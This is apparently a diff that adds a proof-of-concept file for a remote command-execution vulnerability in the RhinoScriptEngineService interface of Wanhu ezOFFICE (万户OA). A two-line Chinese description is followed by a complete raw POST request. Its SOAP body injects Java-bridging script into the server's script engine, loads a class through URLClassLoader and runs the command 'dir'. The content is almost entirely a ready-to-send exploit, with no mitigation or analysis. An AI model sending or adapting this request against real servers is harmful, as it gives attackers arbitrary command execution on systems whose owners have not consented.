@@ -1,0 +1,32 @@
+# 万户OA RhinoScriptEngineService 命令执行漏洞
+# 万户ezOFFICE协同管理平台是一个综合信息基础应用平台。万户OA RhinoScriptEngineService 接口存在命令执行漏洞,该漏洞可能导致攻击者获取系统权限、执行任意命令
+POST //defaultroot/services/./././RhinoScriptEngineService?acid=80051432&bid=hd_tag_m8mv23qt HTTP/1.1
+Host: www.swaf.com
+SOAPAction: '""'
+RM-PRO-BusinessID: hd_tag_m8mv23qt
+RM-PRO-Token: b6b268f68b306d7070cfb35fe8457be7
+RM-PRO-Time: 1742808338747
+User-Agent: curl/7.83.1
+
+<?xml version='1.0' encoding='UTF-8'?>
+         <soapenv:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:jav="http://javascript.script.sun.com">
+           <soapenv:Body>
+             <eval xmlns="http://127.0.0.1:8080/services/scriptEngine">
+               <arg0 xmlns="">
+                 <![CDATA[
+                 try {
+                 load("nashorn:Moziilla_compat.js");
+                 } catch (e) {
+                 }
+                 importPackage(Packages.java.io);
+                 importPackage(Packages.java.lang);
+                 importPackage(Packages.java.util);
+                 importPackage(Packages.java.net);
+                 new URLClassLoader([new File('../server').toURL()]).loadClass('Test12').getConstructor([Class.forName("java.lang.String")]).newInstance(["dir"]).toString()
+                 ]]>
+               </arg0>
+               <arg1 xmlns="" xsi:type="urn:SimpleScriptContext" xmlns:urn="urn:beanservice">
+               </arg1>
+             </eval>
+           </soapenv:Body>
+         </soapenv:Envelope>
